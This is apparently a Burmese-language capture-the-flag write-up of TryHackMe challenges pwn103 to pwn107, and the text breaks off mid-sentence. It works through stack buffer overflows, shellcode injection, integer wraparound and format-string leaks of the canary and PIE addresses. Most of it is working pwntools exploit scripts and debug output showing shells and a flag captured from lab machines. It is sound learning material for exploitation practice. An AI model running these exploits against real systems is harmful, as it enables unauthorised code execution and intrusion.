

#### pwn103

buffer overflow ပြီး `system("/bin/sh");` ခေါ်ပေးတဲ့ function ကို jump ပေးရုံဘဲ
ဒါမဲ့

```python

from pwn import *


context.log_level = 'debug'
context.binary = "./pwn103-1644300337872.pwn103"
elf = context.binary

def start():
    if args.REMOTE:
        return remote("10.48.133.26", 9003)
    elif args.GDB:
        return gdb.debug(elf.path, gdbscript='''
            continue
        ''')
    else:
        return process(elf.path)

#p64(0x0000000000401016)+
def exploit(p):
    payload = b"A" * 40 +  p64(0x0000000000401554)
    p.recvuntil(b"channel: ")
    p.sendline(b"3")
    p.recvuntil(b"[pwner]: ")
    p.sendline(payload)
    p.interactive()


if __name__ == '__main__':
    io = start()
    exploit(io)

```

```
ry harder!!! 💪

👮  Admins only:

Welcome admin 😄
[*] Got EOF while reading in interactive
$ ls
[DEBUG] Sent 0x3 bytes:
    b'ls\n'
$ ls
[DEBUG] Sent 0x3 bytes:
    b'ls\n'
[*] Closed connection to 10.49.156.141 port 9003
[*] Got EOF while sending in interactive
                                                                                                                                                             
┌──(Jackfruit㉿kali)-[~/…/binary/stack/tryhackme/pwn103]
└─$ 


```

ဒီမှာဆို အလုပ်မဖြစ်ဘူး
86-64 ABI (Application Binary Interface) အရ `system()` လိုမျိုး libc function တွေကိုခေါ်တဲ့အခါ 16-byte alignment လိုအပ် (`execve()`မှာမလို)
16 byte aligned စစ်တယ်ဆို ဆိုတာ 16 နဲ့ စားရင်ပြတ်မပြတ်စစ်တာ
ဆိုတော့ ငါတို့ system() မယ့်ကောင်ရဲ့ stack address က 8 ပိုနေလို့ 8 လျှော့အောင် `ret` ROP gadget payload ကြားညှပ်ပြီး ကို ခေါ်ရမယ် ဘာလို့ဆို 
ret ဆိုတာ pop rip ကိုလုပ်ပေးတယ် ပြီးရင် `rsp` - 8 ကိုလုပ်ပေးတယ်ဆိုတော့ ကွက်တိဘဲ ငါတို့ ပိုနေတဲ့ 8 ကိုနှုတ်ပေးတဲ့သဘော

```python
from pwn import *


context.log_level = 'debug'
context.binary = "./pwn103-1644300337872.pwn103"
elf = context.binary

def start():
    if args.REMOTE:
        return remote("10.49.156.141", 9003)
    elif args.GDB:
        return gdb.debug(elf.path, gdbscript='''
            continue
        ''')
    else:
        return process(elf.path)


def exploit(p):
    ret =  p64(0x0000000000401016)
    payload = b"A" * 40 + ret + p64(0x0000000000401554)
    p.recvuntil(b"channel: ")
    p.sendline(b"3")
    p.recvuntil(b"[pwner]: ")
    p.sendline(payload)
    p.interactive()


if __name__ == '__main__':
    io = start()
    exploit(io)
```


```
👮  Admins only:

Welcome admin 😄
$ ls
[DEBUG] Sent 0x3 bytes:
    b'ls\n'
[DEBUG] Received 0x19 bytes:
    b'flag.txt\n'
    b'pwn103\n'
    b'pwn103.c\n'
flag.txt
pwn103
pwn103.c
$ cat flag.txt
[DEBUG] Sent 0xd bytes:
    b'cat flag.txt\n'
[DEBUG] Received 0x13 bytes:
    b'THM{w3lC0m3_4Dm1N}\n'
THM{w3lC0m3_4Dm1N}
$  

```

----


#### pwn104

```
pwndbg> checksec
File:     /home/Jackfruit/cate/learn/binary/stack/tryhackme/pwn104/pwn104-1644300377109.pwn104
Arch:     amd64
RELRO:      Partial RELRO
Stack:      No canary found
NX:         NX unknown - GNU_STACK missing
PIE:        No PIE (0x400000)
Stack:      Executable
RWX:        Has RWX segments
Stripped:   No

```

shell injection ရတော့  shell code inject လုပ်ကြည့်မယ်

```python
from pwn import *


context.log_level = 'debug'
context.binary = "./pwn104-1644300377109.pwn104"
elf = context.binary

def start():
    if args.REMOTE:
        return remote("10.49.156.141", 9004)
    elif args.GDB:
        return gdb.debug(elf.path, gdbscript='''
            break main
            continue
        ''')
    else:
        return process(elf.path)

def exploit(p):
    
    p.recvuntil(b"for you at ")
    buffer = p.recvline().decode().strip()
    buffer = int(buffer, 16)
    shellcode = asm(shellcraft.amd64.sh())
    
    

    payload = b"\x90" * (88 -len(shellcode)) + shellcode + p64(buffer)
    p.sendline(payload)

    p.interactive()


if __name__ == '__main__':
    io = start()
    exploit(io)
```

```
[DEBUG] Using cached assembly output from '/home/Jackfruit/.cache/.pwntools-cache-3.13/asm-cache/99cb4b07dea4b242573197a57eaac16709adb122'
[DEBUG] Sent 0x61 bytes:
    00000000  90 90 90 90  90 90 90 90  90 90 90 90  90 90 90 90  │····│····│····│····│
    *
    00000020  90 90 90 90  90 90 90 90  6a 68 48 b8  2f 62 69 6e  │····│····│jhH·│/bin│
    00000030  2f 2f 2f 73  50 48 89 e7  68 72 69 01  01 81 34 24  │///s│PH··│hri·│··4$│
    00000040  01 01 01 01  31 f6 56 6a  08 5e 48 01  e6 56 48 89  │····│1·Vj│·^H·│·VH·│
    00000050  e6 31 d2 6a  3b 58 0f 05  80 6e 0d 7a  fc 7f 00 00  │·1·j│;X··│·n·z│····│
    00000060  0a                                                  │·│
    00000061
[*] Switching to interactive mode
[*] Got EOF while reading in interactive
$ ls
[DEBUG] Sent 0x3 bytes:
    b'ls\n'
$ ls
[DEBUG] Sent 0x3 bytes:
    b'ls\n'
[*] Closed connection to 10.49.156.141 port 9004
[*] Got EOF while sending in interactive
                                                                                                                                                             
┌──(Jackfruit㉿kali)-[~/…/binary/stack/tryhackme/pwn104]
└─$ 

```

` [ Padding ] + [ Shellcode ]  + [ Return Address (Buffer Start) ]`

ဒါမဲ့ အဆင်မပြေဘူး 

အကြောင်းအရင်းက  shell code ကိုယ်တိုင်လည်း stack ကိုသုံးတယ်
code instruction အများစုက `rsp` ကို  အကြောင်းပြုပြီး stack ကိုပြင်နေတယ်
အဲတော့ shell code က rspနဲနီးသွားရင် ကိုယ့်ကိုကိုပြင်မိပြီး ကိုယ့်ကိုကိုယ်ဖျက်ဆီးမိတယ်
Shellcode က `push` instruction ကို execute လုပ်တဲ့အခါ `$rsp` က နိမ့်ဆီကို ဆင်းသွားပြီး Shellcode ကိုယ်တိုင် နင်းမိတယ်
ဆိုတော့ rspနဲ့ဝေးရာ မှာ shell code ထားရမယ်
Buffer Padding နည်းသွားတဲ့သဘောဖြစ်တယ်


here's new script 
```python
from pwn import *


context.log_level = 'debug'
context.binary = "./pwn104-1644300377109.pwn104"
elf = context.binary

def start():
    if args.REMOTE:
        return remote("10.48.133.26", 9004)
    elif args.GDB:
        return gdb.debug(elf.path, gdbscript='''
            break main
            continue
        ''')
    else:
        return process(elf.path)

def exploit(p):
    
    p.recvuntil(b"for you at ")
    buffer = p.recvline().decode().strip()
    buffer = int(buffer, 16)
    shellcode = asm(shellcraft.amd64.sh())
    ret_addr = p64(buffer + 96) 
    
    # 88 bytes padding + 8 bytes return address + 16 bytes NOP sled + shellcode
    payload = b"\x90" * 88 + ret_addr + b"\x90" * 16 + shellcode
    p.sendline(payload)

    p.interactive()


if __name__ == '__main__':
    io = start()
    exploit(io)
```


----


#### pwn105

wrap around ကိုအသုံးချတဲ့ကောင်
`uint` ကနေ int ကိုပြောင်းပြီး
`uint` ရဲ့ limit က 4,294,967,295 အထိဘဲ
int မှာ  (+) limit က +2,147,483,647 ထိ , (-) ကတော့ အနောက်ကနေစရေတယ်
ဆိုတော့  +2,147,483,647  ထပ်ကျော်တာကိုပေးလိုက်ရင် int ပြောင်းရင် - ဖြစ်မှာဘဲ
(-)နှစ်ခုပေါင်းလည်း (-) ဖြစ်မှဆိုတော့ 2000000000    2000000000 ပေးလိုက်ရင်ရပြီ

```c

void main(void)

{
  long in_FS_OFFSET;
  uint local_1c;
  uint local_18;
  uint local_14;
  long local_10;
  
  local_10 = *(long *)(in_FS_OFFSET + 0x28);
  setup();
  banner();
  puts("-------=[ BAD INTEGERS ]=-------");
  puts("|-< Enter two numbers to add >-|\n");
  printf("]>> ");
  __isoc99_scanf(&DAT_0010216f,&local_1c);
  printf("]>> ");
  __isoc99_scanf(&DAT_0010216f,&local_18);
  local_14 = local_18 + local_1c;
  if (((int)local_1c < 0) || ((int)local_18 < 0)) {
    printf("\n[o.O] Hmmm... that was a Good try!\n",(ulong)local_1c,(ulong)local_18,(ulong)local_14)
    ;
  }
  else if ((int)local_14 < 0) {
    printf("\n[*] C: %d",(ulong)local_14);
    puts("\n[*] Popped Shell\n[*] Switching to interactive mode");
    system("/bin/sh");
  }
  else {
    printf("\n[*] ADDING %d + %d",(ulong)local_1c,(ulong)local_18);
    printf("\n[*] RESULT: %d\n",(ulong)local_14);
  }
  if (local_10 != *(long *)(in_FS_OFFSET + 0x28)) {
                    /* WARNING: Subroutine does not return */
    __stack_chk_fail();
  }
  return;
}


```


---

#### pwn106

ဒီအပုဒ်ကတော့နည်းနည်းစားတယ်

```c
    Arch:       amd64-64-little
    RELRO:      Partial RELRO
    Stack:      Canary found
    NX:         NX enabled
    PIE:        PIE enabled
    Stripped:   No

```

security  ကတော့ ကောင်းတယ်
main ထဲမှာ` printf vulnearability `ဘဲတွေ့တယ်
အခြား functionမပါဘူး

```c

void main(void)

{
  long in_FS_OFFSET;
  char local_48 [56];
  long local_10;
  
  local_10 = *(long *)(in_FS_OFFSET + 0x28);
  setup();
  banner();
  puts(&DAT_00102119);
  printf("Enter your THM username to participate in the giveaway: ");
  read(0,local_48,0x32);
  printf("\nThanks ");
  printf(local_48);
  if (local_10 != *(long *)(in_FS_OFFSET + 0x28)) {
                    /* WARNING: Subroutine does not return */
    __stack_chk_fail();
  }
  return;
}

```

နောက်ပြီးမှတွေ့ရတာက
assembly codes ထဲမှာ
```c
        0010125a e8 1a ff        CALL       setup                                            undefined setup()
                 ff ff
        0010125f b8 00 00        MOV        EAX,0x0
                 00 00
        00101264 e8 98 ff        CALL       banner                                           undefined banner()
                 ff ff
        00101269 48 b8 54        MOV        RAX,"[XXX{MHT"
                 48 4d 7b 
                 58 58 58 5b
        00101273 48 ba 66        MOV        RDX,"der_galf"
                 6c 61 67 
                 5f 72 65 64
        0010127d 48 89 45 a0     MOV        qword ptr [RBP + local_68],RAX
        00101281 48 89 55 a8     MOV        qword ptr [RBP + local_60],RDX
        00101285 48 b8 61        MOV        RAX,"XX]detca"
                 63 74 65 
                 64 5d 58 58



```


```c
   0x000055555555525a <+28>:    call   0x555555555179 <setup>
   0x000055555555525f <+33>:    mov    eax,0x0
   0x0000555555555264 <+38>:    call   0x555555555201 <banner>
   0x0000555555555269 <+43>:    movabs rax,0x5b5858587b4d4854
   0x0000555555555273 <+53>:    movabs rdx,0x6465725f67616c66
   0x000055555555527d <+63>:    mov    QWORD PTR [rbp-0x60],rax
   0x0000555555555281 <+67>:    mov    QWORD PTR [rbp-0x58],rdx
   0x0000555555555285 <+71>:    movabs rax,0x58585d6465746361
   0x000055555555528f <+81>:    mov    QWORD PTR [rbp-0x50],rax

```

string hex တွေသွားတွေ့တယ်
ဘာလို့ decompiled C မှာမတွေ့လဲဆို
`Decompiler` က code ကို analysis လုပ်တဲ့အခါ ဒီ variable ထဲကို တန်ဖိုးတွေ ထည့်ထားပေမဲ့ နောက်ပိုင်းမှာ ဘယ်နေရာမှာမှ ပြန်မသုံးထားဘူး" လို့ ယူဆရင် အဲဒီအပိုင်းကို ဖျောက်ထားလို့
Binary file ကို compile လုပ်လိုက်တဲ့အခါ ဒီစာသားတွေကို variable အနေနဲ့ မသိမ်းဘဲ 
CPU registers ထဲကို တိုက်ရိုက်ထည့်ခိုင်းတဲ့ hardware level command တွေအဖြစ် ပြောင်းလဲသွားလို့ဖြစ်တယ်
ဆိုတော့ `printf` ကိုသုံးပြီး stack ထဲ က ဒီကောင်တွေကို leak ရင်ရ

```c
pwndbg> tel 30
00:0000│ rsp 0x7fffffffdae0 ◂— 'THM{XXX[flag_redacted]XXX}'
01:0008│-058 0x7fffffffdae8 ◂— 'flag_redacted]XXX}'
02:0010│-050 0x7fffffffdaf0 ◂— 'acted]XXX}'
03:0018│-048 0x7fffffffdaf8 ◂— 0x7d58 /* 'X}' */
04:0020│ rdi 0x7fffffffdb00 ◂— 'fasdfdsfsd\n'
05:0028│-038 0x7fffffffdb08 ◂— 0xa6473 /* 'sd\n' */
06:0030│-030 0x7fffffffdb10 ◂— 0
... ↓        4 skipped

```

```python

from pwn import *



context.log_level = 'debug'
context.binary = "pwn106-user-1644300441063.pwn106-user"
elf = context.binary

def start():
    if args.REMOTE:
        return remote("10.48.158.37", 9006)
    elif args.GDB:
        return gdb.debug(elf.path, gdbscript='''
            break main
            continue
        ''')
    else:
        return process(elf.path)
    

def exploit(p):
    p.recvuntil(b"cipate in the giveaway: ")
    payload = b"%6$lx.%7$lx.%8$lx.%9$lx.%10$lx.%11$lx"
    p.sendline(payload)
    p.recvuntil(b"Thanks ")
    flags = p.recvline().decode().strip().split(".")
    ans = ""
    for flag in flags :
        #ans += bytes.fromhex(flag).decode('utf-8')
        ans += unhex(flag)[::-1].decode('utf-8', errors='ignore')
    return ans

if __name__ == '__main__':
    io = start()
    result = exploit(io)
    print(result)
    
    
```

---

#### pwn107

```
File:     /home/Jackfruit/cate/learn/binary/stack/tryhackme/pwn107/pwn107-1644307530397.pwn107
Arch:     amd64
RELRO:      Full RELRO
Stack:      Canary found
NX:         NX enabled
PIE:        PIE enabled
Stripped:   No
pwndbg> 

```

security ကတော့တော်တော်ကောင်းတယ်
shell run ပေးမယ့် function  ရှိတယ်
main function ကိုကြည့်တော့  local_48 မှာ
`printf vuln`ရှိတယ် but  limit ရှိတယ် overflowလို့မရ
loopingလည်းမပတ် `printf` တစ်ခုတည်းကိုဘဲသုံးပြီး return address ကို overwrite ရမလား ဆိုပြီးစဉ်းစားနေတယ်

```c


void main(void)

{
  long in_FS_OFFSET;
  char local_48 [32];
  undefined1 local_28 [24];
  long local_10;
  
  local_10 = *(long *)(in_FS_OFFSET + 0x28);
  setup();
  banner();
  puts(&DAT_00100c68);
  puts(&DAT_00100c88);
  puts("You mailed about this to THM, and they responsed back with some questions");
  puts("Answer those questions and get your streak back\n");
  printf("THM: What\'s your last streak? ");
  read(0,local_48,0x14);
  printf("Thanks, Happy hacking!!\nYour current streak: ");
  printf(local_48);
  puts("\n\n[Few days latter.... a notification pops up]\n");
  puts(&DAT_00100db8);
  read(0,local_28,0x200);
  if (local_10 != *(long *)(in_FS_OFFSET + 0x28)) {
                         /* WARNING: Subroutine does not return */
     __stack_chk_fail();
  }
  return;
}

```




```c

void get_streak(void)

{
  long lVar1;
  long in_FS_OFFSET;
  
  lVar1 = *(long *)(in_FS_OFFSET + 0x28);
  puts("This your last streak back, don\'t do this mistake again");
  system("/bin/sh");
  if (lVar1 != *(long *)(in_FS_OFFSET + 0x28)) {
                         /* WARNING: Subroutine does not return */
     __stack_chk_fail();
  }
  return;
}

```

```c
┌──(Jackfruit㉿kali)-[~/…/binary/stack/tryhackme/pwn107]
└─$ ./pwn107-1644307530397.pwn107
       ┌┬┐┬─┐┬ ┬┬ ┬┌─┐┌─┐┬┌─┌┬┐┌─┐
        │ ├┬┘└┬┘├─┤├─┤│  ├┴┐│││├┤ 
        ┴ ┴└─ ┴ ┴ ┴┴ ┴└─┘┴ ┴┴ ┴└─┘
                 pwn 107         

You are a good THM player 😎
But yesterday you lost your streak 🙁
You mailed about this to THM, and they responsed back with some questions
Answer those questions and get your streak back

THM: What's your last streak? hello
Thanks, Happy hacking!!
Your current streak: hello


[Few days latter.... a notification pops up]

Hi pwner 👾, keep hacking👩💻 - We miss you!😢


```


နောက်တစ်ခုက input ထပ်တောင်းတာတွေ့တယ်

```c
  puts("\n\n[Few days latter.... a notification pops up]\n");
  puts(&DAT_00100db8);
  read(0,local_28,0x200);
  if (local_10 != *(long *)(in_FS_OFFSET + 0x28)) {
                         /* WARNING: Subroutine does not return */
     __stack_chk_fail();
  }
  return;
}
```

read နဲ့တောင်းတယ် overflow လို့ရတယ်
ဆိုတော့ ငါတို့ `printf` မှာ leak ခဲ့တာတွေကို buffer overflow ပြီးပြန်သုံးလို့ရတယ်

```c
pwndbg> tel 30
00:0000│ rdi rsp 0x7fffffffdb20 ◂— 0xa6f6c6c6568 /* 'hello\n' */
01:0008│-038     0x7fffffffdb28 ◂— 0
... ↓            5 skipped
07:0038│-008     0x7fffffffdb58 ◂— 0xe173ca075aed4600
08:0040│ rbp     0x7fffffffdb60 ◂— 1
09:0048│+008     0x7fffffffdb68 —▸ 0x7ffff7c29f68 (__libc_start_call_main+120) ◂— mov edi, eax
0a:0050│+010     0x7fffffffdb70 ◂— 0
0b:0058│+018     0x7fffffffdb78 —▸ 0x555555400992 (main) ◂— push rbp
0c:0060│+020     0x7fffffffdb80 ◂— 0x1ffffdc60
0d:0068│+028     0x7fffffffdb88 —▸ 0x7fffffffdc78 —▸ 0x7fffffffe008 ◂— '/home/Jackfruit/cate/learn/binary/stack/tryhackme/pwn107/pwn107-1644307530397.pwn107'
0e:0070│+030     0x7fffffffdb90 —▸ 0x7fffffffdc78 —▸ 0x7fffffffe008 ◂— '/home/Jackfruit/cate/learn/binary/stack/tryhackme/pwn107/pwn107-1644307530397.pwn107'
0f:0078│+038     0x7fffffffdb98 ◂— 0x7d4c9c0afe066d43
10:0080│+040     0x7fffffffdba0 ◂— 0
11:0088│+048     0x7fffffffdba8 —▸ 0x7fffffffdc88 —▸ 0x7fffffffe05d ◂— 'COLORFGBG=15;0'
12:0090│+050     0x7fffffffdbb0 —▸ 0x7ffff7ffd000 (_rtld_global) —▸ 0x7ffff7ffe2f0 —▸ 0x555555400000 ◂— jg 0x555555400047
13:0098│+058     0x7fffffffdbb8 ◂— 0
14:00a0│+060     0x7fffffffdbc0 ◂— 0x82b363f548e46d43
15:00a8│+068     0x7fffffffdbc8 ◂— 0x82b3738fc0446d43
16:00b0│+070     0x7fffffffdbd0 ◂— 0
... ↓            3 skipped
1a:00d0│+090     0x7fffffffdbf0 —▸ 0x7fffffffdc88 —▸ 0x7fffffffe05d ◂— 'COLORFGBG=15;0'
1b:00d8│+098     0x7fffffffdbf8 ◂— 0xe173ca075aed4600
1c:00e0│+0a0     0x7fffffffdc00 ◂— 0

```

ဒီမှာဆိုငါတို့ leak ရမှာ က `stackcanary` ရယ် `get_streak` နဲ့နီးစပ်တဲ့ address ရယ်ဘဲ ဘာလို့ဆို `get_streak` ကိုအလွယ်တွက်လို့ရတယ်

```c
0b:0058│+018     0x7fffffffdb78 —▸ 0x555555400992 (main) ◂— push rbp
```

ဒီမှာဆို ဒီကောင့်ကိုသွားတွေ့တယ်
ငါတို့ သိထားရမှာ က PIE security မှာ address တွေက 3nibble (3 hex) တွေတူတယ် offset တွေတူတယ်

ဆိုတော့ 

```c
pwndbg> disas get_streak
Dump of assembler code for function get_streak:
   0x000055555540094c <+0>:     push   rbp
   0x000055555540094d <+1>:     mov    rbp,rsp
   0x0000555555400950 <+4>:     sub    rsp,0x10
   0x0000555555400954 <+8>:     mov    rax,QWORD PTR fs:0x28
   0x000055555540095d <+17>:    mov    QWORD PTR [rbp-0x8],rax
   0x0000555555400961 <+21>:    xor    eax,eax
   0x0000555555400963 <+23>:    lea    rdi,[rip+0x2be]        # 0x555555400c28
   0x000055555540096a <+30>:    call   0x555555400710 <puts@plt>
   0x000055555540096f <+35>:    lea    rdi,[rip+0x2ea]        # 0x555555400c60
   0x0000555555400976 <+42>:    call   0x555555400730 <system@plt>
   0x000055555540097b <+47>:    nop
   0x000055555540097c <+48>:    mov    rax,QWORD PTR [rbp-0x8]
   0x0000555555400980 <+52>:    xor    rax,QWORD PTR fs:0x28
   0x0000555555400989 <+61>:    je     0x555555400990 <get_streak+68>
   0x000055555540098b <+63>:    call   0x555555400720 <__stack_chk_fail@plt>
   0x0000555555400990 <+68>:    leave
   0x0000555555400991 <+69>:    ret
End of assembler dump.

```

`0x555555400992`   -  `0x000055555540094c`  = decimal 70 ကွာတယ်
`0x555555400992` က `rdi` ကနေဆို 17 အကွာမှာရှိတယ်
`0xe173ca075aed4600` canary value က 13 အကွာမှာရှိတယ်
ဆိုတော့ python script နဲ့စမ်းကြည့်တယ် မရဘူး ဒီမှာ `system()` ကိုသုံးတဲ့အတွက် stack alignment လိုတယ်
`ret` တစ်ခုထည့်ရမယ် `rop gadget` ရှာရမယ် ဒါမဲ့ `PIE` ရှိတော့ ရှာရခက်တယ်
ဆိုတော့ `main ရဲ့ ret ` ကို `0x555555400992`  ကနေတွက်ပြီး သုံးရမယ်


```c
   0x0000555555400a6e <+220>:   nop
   0x0000555555400a6f <+221>:   mov    rax,QWORD PTR [rbp-0x8]
   0x0000555555400a73 <+225>:   xor    rax,QWORD PTR fs:0x28
   0x0000555555400a7c <+234>:   je     0x555555400a83 <main+241>
   0x0000555555400a7e <+236>:   call   0x555555400720 <__stack_chk_fail@plt>
   0x0000555555400a83 <+241>:   leave
   0x0000555555400a84 <+242>:   ret
End of assembler dump.

```


`0x555555400992`   -  `0x0000555555400a84` = -242(decimal)
`0x0000555555400a84` က ကြီးတဲ့အတွက်  `0x555555400992` ကို 242 ပေါင်းရမယ်


```python
from pwn import *


context.log_level = 'debug'
context.binary = "./pwn107-1644307530397.pwn107"
elf = context.binary

def start():
    if args.REMOTE:
        return remote("10.49.128.220", 9007)
    elif args.GDB:
        return gdb.debug(elf.path, gdbscript='''
            break main
            break get_streak
            continue
        ''')
    else:
        return process(elf.path)

def exploit(p):
    
    p.recvuntil(b"last streak? ")
    p.sendline(b"%13$p.%17$p")
    p.recvuntil(b"current streak: ")
    adds = p.recvline()
    adds = adds.decode().strip().split(".")
    canary = int(adds[0], 16)
    print("the canary : ", hex(canary))
    print("leak main address", adds[1])
    shell = int(adds[1], 16) - 70
    ret = int(adds[1], 16) + 242
    print("the get_steak : ", hex(ret))
    payload = b"A" * 24 +  p64(canary) + b"A" *8   + p64(ret) + p64(shell)
    p.recvuntil(b"We miss you!")
    p.recvline()
    p.sendline(payload)
    p.interactive()


if __name__ == '__main__':
    io = start()
    exploit(io)
```

```c
    000001f0
[DEBUG] Sent 0xc bytes:
    b'%13$p.%17$p\n'
[DEBUG] Received 0xb9 bytes:
    00000000  54 68 61 6e  6b 73 2c 20  48 61 70 70  79 20 68 61  │Than│ks, │Happ│y ha│
    00000010  63 6b 69 6e  67 21 21 0a  59 6f 75 72  20 63 75 72  │ckin│g!!·│Your│ cur│
    00000020  72 65 6e 74  20 73 74 72  65 61 6b 3a  20 30 78 65  │rent│ str│eak:│ 0xe│
    00000030  38 36 62 31  32 30 61 39  36 64 32 33  38 30 30 2e  │86b1│20a9│6d23│800.│
    00000040  30 78 35 36  32 31 64 31  32 30 30 39  39 32 0a 0a  │0x56│21d1│2009│92··│
    00000050  0a 5b 46 65  77 20 64 61  79 73 20 6c  61 74 74 65  │·[Fe│w da│ys l│atte│
    00000060  72 2e 2e 2e  2e 20 61 20  6e 6f 74 69  66 69 63 61  │r...│. a │noti│fica│
    00000070  74 69 6f 6e  20 70 6f 70  73 20 75 70  5d 0a 0a 48  │tion│ pop│s up│]··H│
    00000080  69 20 70 77  6e 65 72 20  f0 9f 91 be  2c 20 6b 65  │i pw│ner │····│, ke│
    00000090  65 70 20 68  61 63 6b 69  6e 67 f0 9f  91 a9 e2 80  │ep h│acki│ng··│····│
    000000a0  8d f0 9f 92  bb 20 2d 20  57 65 20 6d  69 73 73 20  │····│· - │We m│iss │
    000000b0  79 6f 75 21  f0 9f 98 a2  0a                        │you!│····│·│
    000000b9
the canary :  0xe86b120a96d23800
leak main address 0x5621d1200992
the get_steak :  0x5621d1200a84
[DEBUG] Sent 0x39 bytes:
    00000000  41 41 41 41  41 41 41 41  41 41 41 41  41 41 41 41  │AAAA│AAAA│AAAA│AAAA│
    00000010  41 41 41 41  41 41 41 41  00 38 d2 96  0a 12 6b e8  │AAAA│AAAA│·8··│··k·│
    00000020  41 41 41 41  41 41 41 41  84 0a 20 d1  21 56 00 00  │AAAA│AAAA│·· ·│!V··│
    00000030  4c 09 20 d1  21 56 00 00  0a                        │L· ·│!V··│·│
    00000039
[*] Switching to interactive mode
[DEBUG] Received 0x38 bytes:
    b"This your last streak back, don't do this mistake again\n"
This your last streak back, don't do this mistake again
[DEBUG] Received 0x1e bytes:
    b'Detaching from process 133219\n'
Detaching from process 133219
[DEBUG] Received 0x1e bytes:
    b'Detaching from process 133265\n'
Detaching from process 133265
$ ls
[DEBUG] Sent 0x3 bytes:
    b'ls\n'
[DEBUG] Received 0x1e bytes:
    b'Detaching from process 133266\n'
Detaching from process 133266
[DEBUG] Received 0x7d bytes:
    b'core.131436  core.71611  core.75659  core.88595  pwn107-1644307530397.pwn107\n'
    b'core.71009   core.75000  core.87143  exploit.py\n'
core.131436  core.71611  core.75659  core.88595  pwn107-1644307530397.pwn107
core.71009   core.75000  core.87143  exploit.py
[*] Process '/usr/bin/gdbserver' stopped with exit code 0 (pid 133219)
[DEBUG] Received 0x1c bytes:
    b'\n'


```


local မှာ python နဲ့ GDB ကိုတွဲပြီး runကြည့်တာရတယ်
shell ရပြီ

 remote မှာ run ကြည့်တယ်
 
```c
    00000060  74 65 72 2e  2e 2e 2e 20  61 20 6e 6f  74 69 66 69  │ter.│... │a no│tifi│
    00000070  63 61 74 69  6f 6e 20 70  6f 70 73 20  75 70 5d 0a  │cati│on p│ops │up]·│
    00000080  0a                                                  │·│
    00000081
the canary :  0x286d399a3825f900
leak main address 0x7ffeb8996fc8
the get_steak :  0x7ffeb89970ba
[DEBUG] Received 0x3a bytes:
    00000000  48 69 20 70  77 6e 65 72  20 f0 9f 91  be 2c 20 6b  │Hi p│wner│ ···│·, k│
    00000010  65 65 70 20  68 61 63 6b  69 6e 67 f0  9f 91 a9 e2  │eep │hack│ing·│····│
    00000020  80 8d f0 9f  92 bb 20 2d  20 57 65 20  6d 69 73 73  │····│·· -│ We │miss│
    00000030  20 79 6f 75  21 f0 9f 98  a2 0a                     │ you│!···│··│
    0000003a
[DEBUG] Sent 0x39 bytes:
    00000000  41 41 41 41  41 41 41 41  41 41 41 41  41 41 41 41  │AAAA│AAAA│AAAA│AAAA│
    00000010  41 41 41 41  41 41 41 41  00 f9 25 38  9a 39 6d 28  │AAAA│AAAA│··%8│·9m(│
    00000020  41 41 41 41  41 41 41 41  ba 70 99 b8  fe 7f 00 00  │AAAA│AAAA│·p··│····│
    00000030  82 6f 99 b8  fe 7f 00 00  0a                        │·o··│····│·│
    00000039
[*] Switching to interactive mode
[*] Got EOF while reading in interactive
$  

```
EOF ဖြစ်တယ်မရဘူး စဉ်းစားစမ်း
တစ်ခုသိထားမိတာ 
အစောက gdb ကတော့ သူအဆင်ပြတဲ့ address ပေးတာဘဲ decompiled လုပ်ပြီး ဒါမဲ့ ဒီကောင်မှာ ပါတဲ့ lower 3 hexတွေကိုယုံလို့မရဘူး
offset ဘဲရတယ်
ဆိုတော့ python နဲ့ run တဲ့ script ကိုကြည့်တော့ 3 nibbles ကမတူဘူးဖြစ်နေတယ်
local leak `0x5621d1200992` နဲ့ remote leak  `0x7ffeb8996fc8` က နောက်ဆုံး 3hex မတူဘူး
canary value ကတော့မှားတာမဖြစ်နိုင်ဘူး
stack မှာရှုပ်ထွေးရှည်လျားတာ canary ဘဲရှိတယ်
ဆိုတော့ leak main address က 3 nibbles (lower 3 hex)မတူဘူး
rdi ကနေ အကွာအဝေးက Local နဲ့ remote stack မတူတာဖြစ်နိုင်တယ် 
ဆိုတော့ remote printf script စမ်းကြည့်မယ်

```c

──(Jackfruit㉿kali)-[~/…/binary/stack/tryhackme/pwn107]
└─$ nc  10.49.128.220 9007
       ┌┬┐┬─┐┬ ┬┬ ┬┌─┐┌─┐┬┌─┌┬┐┌─┐
        │ ├┬┘└┬┘├─┤├─┤│  ├┴┐│││├┤ 
        ┴ ┴└─ ┴ ┴ ┴┴ ┴└─┘┴ ┴┴ ┴└─┘
                 pwn 107         

You are a good THM player 😎
But yesterday you lost your streak 🙁
You mailed about this to THM, and they responsed back with some questions
Answer those questions and get your streak back

THM: What's your last streak? %13$p.%17$p
Thanks, Happy hacking!!
Your current streak: 0x4d9a4484174af200.0x7fff9b918c08
RV

[Few days latter.... a notification pops up]

Hi pwner 👾, keep hacking👩💻 - We miss you!😢

                                                                                                                                                             
┌──(Jackfruit㉿kali)-[~/…/binary/stack/tryhackme/pwn107]
└─$ nc  10.49.128.220 9007
       ┌┬┐┬─┐┬ ┬┬ ┬┌─┐┌─┐┬┌─┌┬┐┌─┐
        │ ├┬┘└┬┘├─┤├─┤│  ├┴┐│││├┤ 
        ┴ ┴└─ ┴ ┴ ┴┴ ┴└─┘┴ ┴┴ ┴└─┘
                 pwn 107         

You are a good THM player 😎
But yesterday you lost your streak 🙁
You mailed about this to THM, and they responsed back with some questions
Answer those questions and get your streak back

THM: What's your last streak? %13$p.%18$p        
Thanks, Happy hacking!!
Your current streak: 0x3be107d6b205dd00.0x19db4e7a0
▒V

[Few days latter.... a notification pops up]

Hi pwner 👾, keep hacking👩💻 - We miss you!😢

                                                                                                                                                             
┌──(Jackfruit㉿kali)-[~/…/binary/stack/tryhackme/pwn107]
└─$ nc  10.49.128.220 9007
       ┌┬┐┬─┐┬ ┬┬ ┬┌─┐┌─┐┬┌─┌┬┐┌─┐
        │ ├┬┘└┬┘├─┤├─┤│  ├┴┐│││├┤ 
        ┴ ┴└─ ┴ ┴ ┴┴ ┴└─┘┴ ┴┴ ┴└─┘
                 pwn 107         

You are a good THM player 😎
But yesterday you lost your streak 🙁
You mailed about this to THM, and they responsed back with some questions
Answer those questions and get your streak back

THM: What's your last streak? %13$p.%19$p
Thanks, Happy hacking!!
Your current streak: 0xe360bec694023800.0x561557400992
V

[Few days latter.... a notification pops up]

Hi pwner 👾, keep hacking👩💻 - We miss you!😢

```

နောက်ဆုံးတော့ lower 3 hex တူခဲ့ပြီ `0x561557400992`
local က stack လို 17 အကွာမှာရှိတာမဟုတ်ဘဲ
19 အကွာမှာရှိတယ်
ဆိုတော့ 
